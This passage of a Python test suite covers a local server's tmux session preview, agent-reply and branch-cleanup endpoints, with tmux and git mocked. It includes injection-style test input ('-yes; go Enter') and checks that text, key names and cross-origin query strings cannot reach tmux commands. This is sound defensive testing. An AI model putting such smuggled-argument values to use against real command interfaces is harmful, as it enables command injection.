        calls = []
        fake = self._pane_run_tmux("", calls, returncode=1, stderr="can't find session: centrale-my-app-task-9")
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, body = self._get("/api/session-pane?project=my-app&task=TASK-9")
        self.assertEqual(status, 404)
        self.assertIn("no live session", body["error"])

    def test_get_session_pane_no_tmux_server_returns_404_not_500(self):
        fake = self._pane_run_tmux("", [], returncode=1, stderr="no server running on /tmp/tmux-1000/default")
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, body = self._get("/api/session-pane?project=my-app&task=TASK-9")
        self.assertEqual(status, 404)

    def test_get_session_pane_other_tmux_failure_returns_500(self):
        fake = self._pane_run_tmux("", [], returncode=1, stderr="server exited unexpectedly")
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, body = self._get("/api/session-pane?project=my-app&task=TASK-9")
        self.assertEqual(status, 500)
        self.assertIn("capture-pane", body["error"])

    def test_get_session_pane_disabled_returns_403_and_never_touches_tmux(self):
        # "Off" must disable the ENDPOINT, not just hide the UI -- and
        # refuse before any subprocess runs.
        self.config["sessionPreview"] = {"mode": "off"}
        self.addCleanup(lambda: self.config.pop("sessionPreview", None))
        calls = []
        with mock.patch.object(server, "run_tmux", side_effect=self._pane_run_tmux("x\n", calls)):
            status, body = self._get("/api/session-pane?project=my-app&task=TASK-9")
        self.assertEqual(status, 403)
        self.assertIn("disabled", body["error"])
        self.assertEqual(calls, [])

    def test_get_session_pane_validation_errors(self):
        with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._get("/api/session-pane?task=TASK-9")
            self.assertEqual(status, 400)
            status, body = self._get("/api/session-pane?project=doesnotexist&task=TASK-9")
            self.assertEqual(status, 404)
            status, body = self._get("/api/session-pane?project=my-app&task=not-valid!!")
            self.assertEqual(status, 400)
            status, body = self._get("/api/session-pane?project=my-app")
            self.assertEqual(status, 400)

    # -- /api/session-input (task-61) ------------------------------------

    def _reply(self, path, payload):
        return self._post(path, json.dumps(payload).encode("utf-8"))

    def _arm(self, name="centrale-my-app-task-9", age=0.0):
        """Pretend the drawer previewed `name` `age` seconds ago."""
        server.record_pane_capture(name, now=time.monotonic() - age)

    def _sendkeys_run_tmux(self, calls, fail_on=None, returncode=1, stderr="", stdins=None):
        """Fake run_tmux recording every argv in `calls` and, when
        `stdins` is given, the `input=` each call was made with (None for
        the calls that pass no stdin) -- the load-buffer payload is the
        only way the reply text reaches tmux on the task-72 path."""
        def fake(args, input=None):
            calls.append(list(args))
            if stdins is not None:
                stdins.append(input)
            if fail_on is not None and len(calls) == fail_on:
                return subprocess.CompletedProcess(["tmux", *args], returncode, "", stderr)
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")
        return fake

    def _pin_buffer(self, name="centrale-reply-deadbeef"):
        """Make the per-reply tmux buffer name deterministic so tests can
        pin the exact argv (the real one is a fresh uuid per call)."""
        patcher = mock.patch.object(server, "_new_paste_buffer_name", return_value=name)
        patcher.start()
        self.addCleanup(patcher.stop)
        return name

    def test_post_session_input_text_goes_by_bracketed_paste_then_enter(self):
        # task-72: text is delivered through tmux's bracketed-paste path,
        # never as a `send-keys -l` keystroke burst (whose immediately
        # following Enter agent TUIs swallowed into their paste guess).
        self._arm()
        buf = self._pin_buffer()
        calls, stdins = [], []
        with mock.patch.object(server, "run_tmux", side_effect=self._sendkeys_run_tmux(calls, stdins=stdins)):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "-yes; go Enter"})
        self.assertEqual(status, 200)
        self.assertEqual(body["ok"], True)
        self.assertEqual(body["session"], "centrale-my-app-task-9")
        self.assertEqual(body["sent"], {"text": "-yes; go Enter"})
        self.assertIsInstance(body["captureAgeSeconds"], (int, float))
        # Exact argv sequence: load-buffer reads the text from STDIN into
        # an explicitly named buffer (a leading dash, ";" or a key-name-
        # looking word never touch an argv); paste-buffer pastes it with
        # -p (bracketed-paste codes when the app asked for them) and -d
        # (buffer deleted once pasted) into the exact-match "=<name>:"
        # target -- the same target as capture-pane's; then Enter by key
        # name. No sleep, no extra call between paste and Enter.
        self.assertEqual(calls, [
            ["load-buffer", "-b", buf, "-"],
            ["paste-buffer", "-d", "-p", "-b", buf, "-t", "=centrale-my-app-task-9:"],
            ["send-keys", "-t", "=centrale-my-app-task-9:", "Enter"],
        ])
        # The text itself travels ONLY as load-buffer's stdin.
        self.assertEqual(stdins, ["-yes; go Enter", None, None])
        self.assertNotIn("-yes; go Enter", [a for call in calls for a in call])

    def test_post_session_input_text_never_uses_send_keys_l_or_sleeps(self):
        # Belt and braces for the task-72 invariant: the only send-keys in
        # a text delivery is the Enter, and nothing in the path sleeps.
        self._arm()
        self._pin_buffer()
        calls = []
        with mock.patch.object(server, "run_tmux", side_effect=self._sendkeys_run_tmux(calls)), \
                mock.patch.object(server.time, "sleep", side_effect=AssertionError("no sleeps in the reply path")):
            status, _ = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes please"})
        self.assertEqual(status, 200)
        sendkeys = [c for c in calls if c[0] == "send-keys"]
        self.assertEqual(sendkeys, [["send-keys", "-t", "=centrale-my-app-task-9:", "Enter"]])
        self.assertNotIn("-l", [a for call in calls for a in call])

    def test_post_session_input_buffer_name_is_fresh_per_reply(self):
        # The tmux server is shared with the user's own yanks and other
        # drawers: each reply names its own unguessable buffer and pastes
        # exactly that one, never "the most recent buffer".
        self._arm()
        names = []
        for _ in range(2):
            calls = []
            with mock.patch.object(server, "run_tmux", side_effect=self._sendkeys_run_tmux(calls)):
                status, _ = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "ok"})
            self.assertEqual(status, 200)
            load, paste, _enter = calls
            self.assertEqual(load[:2], ["load-buffer", "-b"])
            self.assertTrue(load[2].startswith("centrale-reply-"), load[2])
            self.assertEqual(paste[3:5], ["-b", load[2]])
            names.append(load[2])
        self.assertNotEqual(names[0], names[1])

    def test_post_session_input_failed_paste_deletes_the_orphaned_buffer(self):
        # load-buffer succeeded, paste-buffer failed: -d never ran, so the
        # buffer would linger in the user's buffer list -- delete it, then
        # report the paste failure (a missing session -> 404).
        self._arm()
        buf = self._pin_buffer()
        calls = []
        fake = self._sendkeys_run_tmux(calls, fail_on=2, stderr="can't find session: centrale-my-app-task-9")
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 404)
        self.assertIn("no live session", body["error"])
        self.assertEqual(calls, [
            ["load-buffer", "-b", buf, "-"],
            ["paste-buffer", "-d", "-p", "-b", buf, "-t", "=centrale-my-app-task-9:"],
            ["delete-buffer", "-b", buf],
        ])  # never goes on to press Enter

    def test_post_session_input_sends_each_key_by_name_never_by_paste(self):
        # task-135: a key is ONE send-keys carrying the tmux key NAME. It
        # must never travel the task-72 bracketed-paste path, where the
        # name would arrive as the literal letters "Escape".
        self._arm()
        for key in ("Escape", "Enter"):
            with self.subTest(key=key):
                calls, stdins = [], []
                with mock.patch.object(server, "run_tmux", side_effect=self._sendkeys_run_tmux(calls, stdins=stdins)):
                    status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "key": key})
                self.assertEqual(status, 200)
                self.assertEqual(body["sent"], {"key": key})
                self.assertEqual(calls, [["send-keys", "-t", "=centrale-my-app-task-9:", key]])
                self.assertEqual(stdins, [None])  # no load-buffer, so no stdin
                self.assertNotIn("-l", calls[0])

    def test_post_session_input_key_allowlist_is_exactly_escape_and_enter(self):
        # tmux sends an UNKNOWN key name as literal text, so an open-ended
        # "key" would be a second text channel with none of the text
        # validation -- and "y", which task-77 removed, stays removed.
        self.assertEqual(server.SESSION_INPUT_KEYS, ("Escape", "Enter"))
        self._arm()
        for key in ("y", "escape", "C-c", "Up", "q", "", 42, None):
            with self.subTest(key=key):
                with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
                    status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "key": key})
                self.assertEqual(status, 400)
                self.assertIn("key must be one of", body["error"])

    def test_post_session_input_refuses_a_body_carrying_both_text_and_key(self):
        # Exactly-one-of, never a guess about which the user meant.
        self._arm()
        with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._reply(
                "/api/session-input",
                {"project": "my-app", "taskId": "TASK-9", "text": "yes", "key": "Enter"},
            )
        self.assertEqual(status, 400)
        self.assertIn("exactly one", body["error"])

    def test_post_session_input_still_rejects_an_unknown_body_field(self):
        # task-77's unknown-field rejection survives the key path's return:
        # only text, key and the addressing fields are accepted.
        self._arm()
        with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._reply(
                "/api/session-input", {"project": "my-app", "taskId": "TASK-9", "keys": "Escape"}
            )
        self.assertEqual(status, 400)
        self.assertIn("unknown request body field", body["error"])
        self.assertIn("'keys'", body["error"])

    def test_post_session_input_accepts_identity_via_json_body(self):
        self._arm()
        buf = self._pin_buffer()
        calls = []
        with mock.patch.object(server, "run_tmux", side_effect=self._sendkeys_run_tmux(calls)):
            status, body = self._reply(
                "/api/session-input",
                {"project": "my-app", "taskId": "TASK-9", "text": "continue"},
            )
        self.assertEqual(status, 200)
        self.assertEqual(body["sent"], {"text": "continue"})
        self.assertEqual(calls, [
            ["load-buffer", "-b", buf, "-"],
            ["paste-buffer", "-d", "-p", "-b", buf, "-t", "=centrale-my-app-task-9:"],
            ["send-keys", "-t", "=centrale-my-app-task-9:", "Enter"],
        ])

    def test_post_session_input_resolves_dotted_subtask_id_via_task59_encoding(self):
        self._arm("centrale-my-app-task-11_2")
        buf = self._pin_buffer()
        calls = []
        with mock.patch.object(server, "run_tmux", side_effect=self._sendkeys_run_tmux(calls)):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-11.2", "text": "continue"}
            )
        self.assertEqual(status, 200)
        self.assertEqual(body["session"], "centrale-my-app-task-11_2")
        self.assertEqual(calls, [
            ["load-buffer", "-b", buf, "-"],
            ["paste-buffer", "-d", "-p", "-b", buf, "-t", "=centrale-my-app-task-11_2:"],
            ["send-keys", "-t", "=centrale-my-app-task-11_2:", "Enter"],
        ])

    def test_post_session_input_rejects_bad_text_without_tmux(self):
        self._arm()
        cases = {
            "empty": "",
            "whitespace only": "   ",
            "newline": "yes\nno",
            "carriage return": "yes\r",
            "tab": "a\tb",
            "control char": "abc\x03",
            "too long": "x" * (server.MAX_SESSION_INPUT_TEXT_CHARS + 1),
            "not a string": 42,
        }
        for label, text in cases.items():
            with self.subTest(case=label):
                with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
                    status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": text})
                self.assertEqual(status, 400, label)
                self.assertIn("error", body)
        # The boundary itself is fine.
        calls = []
        with mock.patch.object(server, "run_tmux", side_effect=self._sendkeys_run_tmux(calls)):
            status, _ = self._reply("/api/session-input",
                {"project": "my-app", "taskId": "TASK-9", "text": "x" * server.MAX_SESSION_INPUT_TEXT_CHARS},
            )
        self.assertEqual(status, 200)

    def test_post_session_input_requires_text_and_valid_json(self):
        self._arm()
        with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", })
            self.assertEqual(status, 400)
            self.assertIn('"text"', body["error"])
            status, body = self._post("/api/session-input", b"not json")
            self.assertEqual(status, 400)
            status, body = self._post_json("/api/session-input", {"project": "my-app", "taskId": "TASK-9"})
            self.assertEqual(status, 400)

    def test_post_session_input_without_any_capture_returns_409_and_never_touches_tmux(self):
        # The drawer never previewed this session (or the server restarted
        # since): a reply against an unseen pane is refused.
        with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "continue"})
        self.assertEqual(status, 409)
        self.assertIn("no fresh pane capture", body["error"])
        self.assertIsNone(body["captureAgeSeconds"])

    def test_post_session_input_with_stale_capture_returns_409_with_age(self):
        self._arm(age=server.SESSION_INPUT_MAX_CAPTURE_AGE_SECONDS + 5)
        with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 409)
        self.assertGreater(body["captureAgeSeconds"], server.SESSION_INPUT_MAX_CAPTURE_AGE_SECONDS)
        # A capture of a DIFFERENT session must not arm this one.
        self._arm("centrale-my-app-task-2")
        with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 409)

    def test_get_session_pane_arms_session_input(self):
        # End to end through the real capture handler: a successful
        # GET /api/session-pane is what makes the reply allowed.
        buf = self._pin_buffer()
        calls = []

        def fake(args, input=None):
            calls.append(list(args))
            if args[0] == "capture-pane":
                return subprocess.CompletedProcess(["tmux", *args], 0, "? proceed (y/n)\n", "")
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, _ = self._get("/api/session-pane?project=my-app&task=TASK-9")
            self.assertEqual(status, 200)
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 200)
        self.assertEqual(calls[1:], [
            ["load-buffer", "-b", buf, "-"],
            ["paste-buffer", "-d", "-p", "-b", buf, "-t", "=centrale-my-app-task-9:"],
            ["send-keys", "-t", "=centrale-my-app-task-9:", "Enter"],
        ])
        # A failed capture does NOT arm.
        server._reset_pane_capture_times()
        with mock.patch.object(server, "run_tmux", return_value=subprocess.CompletedProcess(["tmux"], 1, "", "can't find session: x")):
            status, _ = self._get("/api/session-pane?project=my-app&task=TASK-9")
            self.assertEqual(status, 404)
        with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, _ = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 409)

    def test_post_session_input_session_gone_returns_404(self):
        # The session vanished between paste and Enter.
        self._arm()
        calls = []
        fake = self._sendkeys_run_tmux(calls, fail_on=3, stderr="can't find session: centrale-my-app-task-9")
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 404)
        self.assertIn("no live session", body["error"])
        self.assertEqual([c[0] for c in calls], ["load-buffer", "paste-buffer", "send-keys"])

    def test_post_session_input_no_tmux_server_returns_404_not_500(self):
        self._arm()
        # load-buffer is the first call on the text path and is what sees
        # a dead server; tmux 3.4 phrases that as "error connecting to
        # <socket> (No such file or directory)" (verified).
        calls = []
        fake = self._sendkeys_run_tmux(
            calls, fail_on=1, stderr="error connecting to /tmp/tmux-1000/default (No such file or directory)"
        )
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 404)
        self.assertEqual([c[0] for c in calls], ["load-buffer"])

    def test_post_session_input_other_tmux_failure_returns_500(self):
        self._arm()
        self._pin_buffer()
        # The Enter after the paste fails: surfaced as 500 naming send-keys.
        fake = self._sendkeys_run_tmux([], fail_on=3, stderr="server exited unexpectedly")
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 500)
        self.assertIn("send-keys", body["error"])
        # A paste failure that is not "session gone" names paste-buffer,
        # after the orphaned buffer was dropped.
        calls = []
        fake = self._sendkeys_run_tmux(calls, fail_on=2, stderr="no buffer centrale-reply-deadbeef")
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 500)
        self.assertIn("paste-buffer", body["error"])
        self.assertEqual([c[0] for c in calls], ["load-buffer", "paste-buffer", "delete-buffer"])
        # A load-buffer failure that is not "server gone" names load-buffer
        # and never pastes.
        calls = []
        fake = self._sendkeys_run_tmux(calls, fail_on=1, stderr="server exited unexpectedly")
        with mock.patch.object(server, "run_tmux", side_effect=fake):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 500)
        self.assertIn("load-buffer", body["error"])
        self.assertEqual([c[0] for c in calls], ["load-buffer"])

    def test_post_session_input_disabled_tiers_return_403_and_never_touch_tmux(self):
        # Both "off" and the preview-only "view" tier refuse the ENDPOINT,
        # before any subprocess -- AND, for "view", the read-only pane
        # keeps working: that's the independent disable the task is about.
        self._arm()
        self.addCleanup(lambda: self.config.pop("sessionPreview", None))
        for mode in ("off", "view"):
            with self.subTest(mode=mode):
                self.config["sessionPreview"] = {"mode": mode}
                with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
                    status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
                self.assertEqual(status, 403)
                self.assertIn("disabled", body["error"])
                self.assertIn(mode, body["error"])
        self.config["sessionPreview"] = {"mode": "view"}
        with mock.patch.object(server, "run_tmux", side_effect=self._pane_run_tmux("still here\n", [])):
            status, body = self._get("/api/session-pane?project=my-app&task=TASK-9")
        self.assertEqual(status, 200)
        self.assertEqual(body["lines"], ["still here"])

    def test_post_session_input_identity_validation_errors(self):
        self._arm()
        with mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._reply("/api/session-input", {"taskId": "TASK-9", "text": "yes"})
            self.assertEqual(status, 400)
            status, body = self._reply("/api/session-input", {"project": "doesnotexist", "taskId": "TASK-9", "text": "yes"})
            self.assertEqual(status, 404)
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "not-valid!!", "text": "yes"})
            self.assertEqual(status, 400)
            status, body = self._reply("/api/session-input", {"project": "my-app", "text": "yes"})
            self.assertEqual(status, 400)
        # task-99: the query string is dead here -- the body alone decides
        # which session the reply reaches. A ?project=&task= pointing at
        # another task is ignored rather than obeyed, which is the whole
        # point: a cross-origin form can put anything in a URL, and
        # nothing in a JSON body.
        buf = self._pin_buffer()
        calls = []
        with mock.patch.object(server, "run_tmux", side_effect=self._sendkeys_run_tmux(calls)):
            status, body = self._reply(
                "/api/session-input?project=my-app&task=TASK-2",
                {"project": "my-app", "taskId": "TASK-9", "text": "yes"},
            )
        self.assertEqual(status, 200)
        self.assertEqual(body["session"], "centrale-my-app-task-9")
        self.assertEqual(calls, [
            ["load-buffer", "-b", buf, "-"],
            ["paste-buffer", "-d", "-p", "-b", buf, "-t", "=centrale-my-app-task-9:"],
            ["send-keys", "-t", "=centrale-my-app-task-9:", "Enter"],
        ])

    def test_post_session_input_refuses_session_not_attributable_to_a_board_task(self):
        # The computed session name must round-trip through the shared
        # TASK-59-safe reverse lookup to this same project/task; a
        # lookup that disagrees (here: forced) is refused before tmux.
        self._arm()
        with mock.patch.object(server, "_parse_session_project_and_task", return_value=(None, None)), \
                mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 404)
        self.assertIn("does not resolve to a known board task", body["error"])
        other = ({"name": "other", "path": "/x"}, "task-9")
        with mock.patch.object(server, "_parse_session_project_and_task", return_value=other), \
                mock.patch.object(server, "run_tmux", side_effect=AssertionError("tmux must not run")):
            status, body = self._reply("/api/session-input", {"project": "my-app", "taskId": "TASK-9", "text": "yes"})
        self.assertEqual(status, 404)

    def test_board_exposes_session_preview_mode(self):
        with mock.patch.object(server, "run_backlog", return_value={"schemaVersion": 1, "tasks": []}):
            status, body = self._get("/api/board")
        self.assertEqual(status, 200)
        self.assertEqual(body["sessionPreviewMode"], "interact")
        self.config["sessionPreview"] = {"mode": "off"}
        self.addCleanup(lambda: self.config.pop("sessionPreview", None))
        with mock.patch.object(server, "run_backlog", return_value={"schemaVersion": 1, "tasks": []}):
            status, body = self._get("/api/board")
        self.assertEqual(body["sessionPreviewMode"], "off")

    # -- /api/cleanup-branch (task-43) ------------------------------------

    def _no_live_sessions_run_tmux(self, args):
        if args[0] == "list-sessions":
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")
        return subprocess.CompletedProcess(["tmux", *args], 0, "", "")

    def _run_backlog_task_status(self, task_id, status):
        # task-45: /api/cleanup-branch reads the main-side task status
        # via the same `backlog task view --json` boundary harvest.py's
        # own gates use, so this stands in for it in these tests.
        def fake(args, cwd):
            if args[:2] == ["task", "view"] and args[2] == task_id:
                return {"task": {"id": task_id, "status": status}}
            raise AssertionError(f"unexpected run_backlog call: {args}")
        return fake

    def test_post_cleanup_branch_removes_worktree_and_deletes_branch_reporting_discarded_paths(self):
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")
        branch = "task/task-9"
        # Realistic spaced Backlog.md filenames (not toy names) -- git
        # quotes these, and a dequoting mismatch hides in exactly this
        # kind of fixture (see server.dequote_git_path).
        status_output = (
            ' M "backlog/tasks/task-9 - Detect externally merged branches, replace Merge with informed cleanup.md"\n'
            '?? "backlog/drafts/task-9.1 - Follow-up notes for cleanup edge cases.md"\n'
        )
        git_calls = []

        def fake_run_git(args, cwd=None):
            git_calls.append((tuple(args), cwd))
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["status"]:
                return git_proc(args, 0, status_output, "")
            if args[:1] == ["worktree"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["branch"]:
                return git_proc(args, 0, "", "")
            return git_proc(args, 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "Done")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 200)
        self.assertTrue(body["ok"])
        self.assertEqual(body["branch"], branch)
        self.assertTrue(body["worktreeRemoved"])
        self.assertEqual(
            body["discardedPaths"],
            [
                "backlog/tasks/task-9 - Detect externally merged branches, replace Merge with informed cleanup.md",
                "backlog/drafts/task-9.1 - Follow-up notes for cleanup edge cases.md",
            ],
        )

        # Removal order: worktree remove --force, then branch -d. (task-80:
        # a read-only `worktree list --porcelain` classification precedes
        # both, so look for the remove specifically.)
        worktree_call = next(c for c in git_calls if c[0][:2] == ("worktree", "remove"))
        branch_call = next(c for c in git_calls if c[0][:1] == ("branch",))
        self.assertEqual(worktree_call[0], ("worktree", "remove", "--force", wt_dir))
        self.assertEqual(branch_call[0], ("branch", "-d", branch))
        self.assertLess(git_calls.index(worktree_call), git_calls.index(branch_call))

    def test_post_cleanup_branch_clean_worktree_returns_empty_discarded_paths(self):
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")

        def fake_run_git(args, cwd=None):
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["status"]:
                return git_proc(args, 0, "", "")
            return git_proc(args, 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "Done")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 200)
        self.assertEqual(body["discardedPaths"], [])

    def test_post_cleanup_branch_accepts_identity_via_json_body(self):
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")

        def fake_run_git(args, cwd=None):
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 0, "", "")
            return git_proc(args, 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "Done")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
            status, body = self._post(
                "/api/cleanup-branch",
                json.dumps({"project": "my-app", "taskId": "TASK-9"}).encode("utf-8"),
            )

        self.assertEqual(status, 200)
        self.assertTrue(body["ok"])

    def test_post_cleanup_branch_missing_project_returns_400(self):
        status, body = self._post_json("/api/cleanup-branch", {"taskId": "TASK-9"})
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    def test_post_cleanup_branch_unknown_project_returns_404(self):
        status, body = self._post_json("/api/cleanup-branch", {"project": "doesnotexist", "taskId": "TASK-9"})
        self.assertEqual(status, 404)
        self.assertIn("error", body)

    def test_post_cleanup_branch_invalid_task_id_returns_400(self):
        status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "not-a-valid-id!!"})
        self.assertEqual(status, 400)
        self.assertIn("error", body)

    def test_post_cleanup_branch_live_session_returns_409(self):
        list_stdout = "centrale-my-app-task-9\t1690000000\t1\n"

        def fake_run_tmux(args):
            if args[0] == "list-sessions":
                return subprocess.CompletedProcess(["tmux", *args], 0, list_stdout, "")
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=fake_run_tmux):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 409)
        self.assertIn("live tmux session", body["error"])

    def test_post_cleanup_branch_live_session_returns_409_for_dotted_subtask_id(self):
        # task-59: same clean 409 must apply to a dotted subtask id's
        # live session, matched via its tmux-safe "_"-encoded name.
        list_stdout = "centrale-my-app-task-11_2\t1690000000\t1\n"

        def fake_run_tmux(args):
            if args[0] == "list-sessions":
                return subprocess.CompletedProcess(["tmux", *args], 0, list_stdout, "")
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=fake_run_tmux):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-11.2"})

        self.assertEqual(status, 409)
        self.assertIn("live tmux session", body["error"])
        self.assertIn("centrale-my-app-task-11_2", body["error"])

    def test_post_cleanup_branch_not_an_ancestor_returns_409(self):
        # ancestor=False, status=Done -- a genuinely unmerged branch on a
        # task someone marked Done early must still refuse.
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")

        def fake_run_git(args, cwd=None):
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 1, "", "")  # not an ancestor -- not merged
            return git_proc(args, 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "Done")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 409)
        self.assertIn("not fully merged", body["error"])

    def test_post_cleanup_branch_ancestor_but_status_not_done_returns_409(self):
        # task-45 (the TASK-2/TASK-3 finding in another repo): a freshly spawned,
        # still In Progress claim branch is trivially an ancestor of
        # main (its only commit already exists there) but must still
        # refuse -- ancestry alone is not "already merged".
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")

        def fake_run_git(args, cwd=None):
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                raise AssertionError("merge-base must not even run when status isn't Done")
            return git_proc(args, 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "In Progress")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 409)
        self.assertIn("not fully merged", body["error"])

    def test_post_cleanup_branch_status_read_failure_fails_safe_to_409(self):
        # A backlog CLI failure reading main-side status must never be
        # treated as Done -- fail safe into a refusal, not a false
        # already-merged cleanup.
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")

        def fake_run_git(args, cwd=None):
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                raise AssertionError("merge-base must not run when status couldn't be read")
